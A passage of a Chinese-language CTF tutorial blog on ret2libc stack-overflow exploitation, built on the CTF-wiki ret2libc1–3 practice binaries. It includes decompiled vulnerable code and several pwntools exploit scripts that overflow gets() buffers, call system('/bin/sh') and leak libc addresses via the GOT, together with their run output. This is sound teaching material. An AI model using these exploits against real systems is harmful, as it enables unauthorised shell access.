class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>中间的<code>&#39;b&#39; * 4</code>是一个虚假的返回地址，因为调用一个函数是先要把一个返回地址压入栈，然后才是参数</p><h4 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h4><p>示例：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1</a></p><p>查一下保护，NX保护开启，32位程序</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure><p>运行一下，啥也没有</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">RET2LIBC &gt;_&lt;<br><span class="hljs-number">114514</span><br>~<span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure><p>看一下源码，首先是<code>main</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);&lt;--<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到用了<code>gets</code>函数，是一个溢出点。可以通过IDA或者手动测量得出栈的长度，为112字节。</p><p>再看一下旁边的<code>secure</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">secure</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">time_t</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> input; <span class="hljs-comment">// [esp+18h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> secretcode; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v0 = time(<span class="hljs-number">0</span>);<br>  srand(v0);<br>  secretcode = rand();<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;input);<br>  <span class="hljs-keyword">if</span> ( input == secretcode )<br>    system(<span class="hljs-string">&quot;shell!?&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>逻辑简单来说就是以时间戳为种子，生成随机数，与用户输入的值相比较，如果相同，执行<code>system</code>函数。<br>而且<code>system</code>处于共享对象中，第一次调用函数时，会把函数真实的地址写入got表中，所以我们可以直接覆盖函数返回地址使其调用 system()@plt 模拟 system() 函数真实调用。IDA 中找到 system@plt 的地址</p><p>既然有了<code>system</code>函数，我们接下来找<code>/bin/sh</code>，既可以通过ropgadget找，也可以通过IDA找，最后其地址为<code>0x08048720</code></p><p>最后，我们构建如下exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h4><p>示例文件：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc2">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc2</a></p><p>查一下保护，NX保护，32位</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure><p>运行一下，没啥特别</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Something surprise here, but I don<span class="hljs-comment">&#x27;t think it will work.</span><br>What <span class="hljs-keyword">do</span> you think ????<br></code></pre></td></tr></table></figure><p>看一下源码，<code>main</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you think ?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有<code>gets</code>函数，有溢出点，栈长112字节</p><p>看一下<code>secure</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">secure</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">time_t</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> input; <span class="hljs-comment">// [esp+18h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> secretcode; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v0 = time(<span class="hljs-number">0</span>);<br>  srand(v0);<br>  secretcode = rand();<br>  __isoc99_scanf(&amp;unk_8048760, &amp;input);<br>  <span class="hljs-keyword">if</span> ( input == secretcode )<br>    system(<span class="hljs-string">&quot;no_shell_QQ&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>和上面一样，随机数，并且调用了<code>system</code>函数，并且在动态对象里，而且这是第一次调用，<code>system@plt</code>地址是<code>0x08048490</code></p><p>接下来我们找<code>/bin/sh</code>，但是，没有找到<code>/bin/sh</code>，但是，我们却在bss段内找到一个可利用空间。</p><p>那么我们就可以构建如下exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>bss_addr = <span class="hljs-number">0x0804A080</span><br>gets_plt = <span class="hljs-number">0x08048460</span><br>sys_plt  = <span class="hljs-number">0x08048490</span><br><br>io=process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;What do you think ?&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(bss_addr)+p32(bss_addr)<br>io.sendline(payload)<br>io.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>payload解读：<br>首先使用112个A字符填充栈，使栈发生溢出，再用gets函数的plt地址来覆盖原返回地址，使程序流执行到gets函数，参数就是bss段的地址（bss段的变量），目的是为了使用gets函数将&#x2F;bin&#x2F;sh 写入到bss段中。接下来在使用systm函数覆盖gets函数的返回地址，使程序执行到system函数，其参数也是bss段中的内容，也就是&#x2F;bin&#x2F;sh。最后的io.sendline(‘&#x2F;bin&#x2F;sh’)是为了将bss段上变量的内容替换成&#x2F;bin&#x2F;sh（也就是说在执行sendline(‘&#x2F;bin&#x2F;sh’)之前，bss段上的变量未被初始化，其内容为空）。</p><p>至于为什么要写成payload &#x3D; ‘A’*112 + p32(gets_plt) + p32(sys_plt) + p32(bss_addr)+p32(bss_addr)，那是因为sys_plt要当作gets_plt的返回值。</p><h4 id="实例4"><a href="#实例4" class="headerlink" title="实例4"></a>实例4</h4><p>示例：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3</a></p><p>查一下保护，NX保护，32位</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure><p>源码和上两个差不多，栈长112字节，与上两个不同的是，这次既没有<code>system</code>函数，也没有<code>/bin/sh</code>。</p><p>那我们现在的当务之急是找到<code>system</code>函数的地址，那我们应该如何得到呢？这里主要利用了两个知识点：</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而 libc 在github上有人进行收集，如下<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以我们只要得到libc的版本，就可以知道了system函数和&#x2F;bin&#x2F;sh的偏移量。知道偏移量后，再找到libc的基地址，就可以得到system函数的真实地址，就可以做我们想要做的事情了，我们可以通过一个公式来得到system的真实地址。</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">libc基地址  +  函数偏移量   </span>=<span class="hljs-string">  函数真实地址</span><br></code></pre></td></tr></table></figure><p>举个例子：如计算<code>system</code>函数在内存空间中的函数地址：</p><ul><li>拿到__libc_start_main函数在内存空间中的地址addr_main</li><li>__libc_start_main函数相对于libc.so.6的起始地址是addr_a（前提是需要知道libc的版本）</li><li>system函数相对于libc.so.6的起始地址是addr_b</li><li>则system函数在内存中真正的地址为addr_main + addr_b - addr_a</li></ul><p>问题又来了，我们该如何泄露函数的真实地址的，这里涉及到了libc的延迟绑定技术，第一次调用时，发生如下过程</p><img src = "https://i-blog.csdnimg.cn/blog_migrate/ad67f17c70087b8151988d5e0ddc8fbe.png"><p>第二次调用时，发生如下过程：</p><img src="https://i-blog.csdnimg.cn/blog_migrate/3110f76e0ccc12a6ab1f26904138b18c.png"><p>我们要泄露函数的真实地址，一般的方法是采用got表泄露，因为只要之前执行过puts函数，got表里存放着就是函数的真实地址了，这里我用的是puts函数，因为程序里已经运行过了puts函数，真实地址已经存放到了got表内。我们得到puts函数的got地址后，可以把这个地址作为参数传递给puts函数，则会把这个地址里的数据，即puts函数的真实地址给输出出来，这样我们就得到了puts函数的真实地址。<br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span><br>puts_plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#puts的plt表的地址，我们需要利用puts函数泄露</span><br>main_plt_addr = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment">#返回地址被覆盖为main函数的地址。使程序还可被溢出</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_got_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_plt_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;main_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(main_plt_addr))<br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span><br>payload += p32(puts_plt_addr)<span class="hljs-comment">#覆盖返回地址为puts函数</span><br>payload += p32(main_plt_addr)<span class="hljs-comment">#这里是puts函数返回的地址。</span><br>payload += p32(puts_got_addr)<span class="hljs-comment">#这里是puts函数的参数</span><br><br>p.recv()<span class="hljs-comment">#接收程序一开始输出的一些信息</span><br>p.sendline(payload)<br><br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment">#将地址输出出来后再用332解包，此时就得到了puts函数的真实地址。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br></code></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2libc3&#x27;</span>: pid 2997<br>[*] <span class="hljs-string">&#x27;/home/xyq/ret2libc3_/ret2libc3&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br>    Debuginfo:  Yes<br>puts_got_addr =  0x804a018<br>puts_plt_addr =  0x8048460<br>main_plt_addr =  0x80484d0<br>puts_addr =  0xea8692a0<br>[*] Stopped process <span class="hljs-string">&#x27;./ret2libc3&#x27;</span> (pid 2997)<br></code></pre></td></tr></table></figure><p>每一次运行时<code>puts_addr</code>的值都会发生改变，这是因为Linux系统开了ASLR（地址随机化）保护，但是它不会改变最低12位，因为需要内存对齐，在我的虚拟机上，<code>puts</code>函数的真实地址的最低12位为<code>2a0</code>，可以在<a href="https://libc.blukat.me/?q=__libc_start_main_ret%3Ae81">这个网站</a>上可以根据后十二位查到这个函数所在的libc的版本，我查到了7个版本，所以，这里我们用一个小工具<code>LibcSearcher</code>包</p><p>于是，我们对EXP做出如下修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span><br>puts_plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#puts的plt表的地址，我们需要利用puts函数泄露</span><br>main_plt_addr = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment">#返回地址被覆盖为main函数的地址。使程序还可被溢出</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_got_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_plt_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;main_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(main_plt_addr))<br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span><br>payload += p32(puts_plt_addr)<span class="hljs-comment">#覆盖返回地址为puts函数</span><br>payload += p32(main_plt_addr)<span class="hljs-comment">#这里是puts函数返回的地址。</span><br>payload += p32(puts_got_addr)<span class="hljs-comment">#这里是puts函数的参数</span><br><br>p.recv()<span class="hljs-comment">#接收程序一开始输出的一些信息</span><br>p.sendline(payload)<br><br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment">#将地址输出出来后再用332解包，此时就得到了puts函数的真实地址。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>) <span class="hljs-comment">#libc基地址 = 函数真实地址 - 函数的偏移量</span><br>system_addr = libcbase + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span> + p32(system_addr) + p32(<span class="hljs-number">1234</span>) + p32(binsh_addr)<br><br>p.recv()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>如果无法查询到libc库的信息，可以看看<a href = "https://blog.csdn.net/yongbaoii/article/details/113764938">这篇文章</a></p><p>输出如下结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bush">[*] Checking for new versions of pwntools<br>    To disable this functionality, set the contents of /home/xyq/.cache/.pwntools-cache-3.10/update to &#x27;never&#x27; (old way).<br>    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] You have the latest version of Pwntools (4.13.1)<br>[+] Starting local process &#x27;./ret2libc3&#x27;: pid 2449<br>[*] &#x27;/home/xyq/ret2libc3_/ret2libc3&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br>    Debuginfo:  Yes<br>puts_got_addr =  0x804a018<br>puts_plt_addr =  0x8048460<br>main_plt_addr =  0x80484d0<br>puts_addr =  0xf29482a0<br>Multi Results:<br> 0: ubuntu-glibc (id libc6_2.35-0ubuntu3.8_i386)<br> 1: ubuntu-old-glibc (id libc6-x32_2.34-0ubuntu3_amd64)<br> 2: ubuntu-old-glibc (id libc6-x32_2.34-0ubuntu3_i386)<br>Please supply more info using <br>add_condition(leaked_func, leaked_address).<br>You can choose it by hand<br>Or type &#x27;exit&#x27; to quit:exit<br>[*] Stopped process &#x27;./ret2libc3&#x27; (pid 2449)<br></code></pre></td></tr></table></figure><p>我们可以看到输出了三个<code>libc</code>库，一般来说，第一个，较新的<code>libc</code>库是这个程序所用的库。当然，也可以不在exp中导入<code>LibcSearcher</code>包，可以在得出<code>puts</code>函数的真实地址后，用<code>Libcseracher/libc-database</code>下的<code>find</code>程序来找到对应的库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./find puts 2a0<br>ubuntu-glibc (libc6_2.35-0ubuntu3.8_i386)<br></code></pre></td></tr></table></figure><p>之后，我们需要用到该目录下的<code>dump</code>程序来差这个库的偏移</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">./dump libc6_2.<span class="hljs-number">35</span>-<span class="hljs-number">0</span>ubuntu3.<span class="hljs-number">8</span>_i386<br>offset___libc_start_main_ret <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x21519<br>offset_system <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x00048170<br>offset_dup2 <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0010afb0<br>offset_read <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0010a170<br>offset_write <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0010a240<br>offset_str_bin_sh <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x1bd0d5<br>❯ ./dump libc6_2.<span class="hljs-number">35</span>-<span class="hljs-number">0</span>ubuntu3.<span class="hljs-number">8</span>_i386 puts<br>offset_puts <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x000732a0       //我们需要这个来找到libc库的基地址<br></code></pre></td></tr></table></figure><p>有了这些，我们就即可以构造完整的exp了（如果上一步用了<code>LibcSearcher</code>包，这一步就可以把相关代码注释掉了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<span 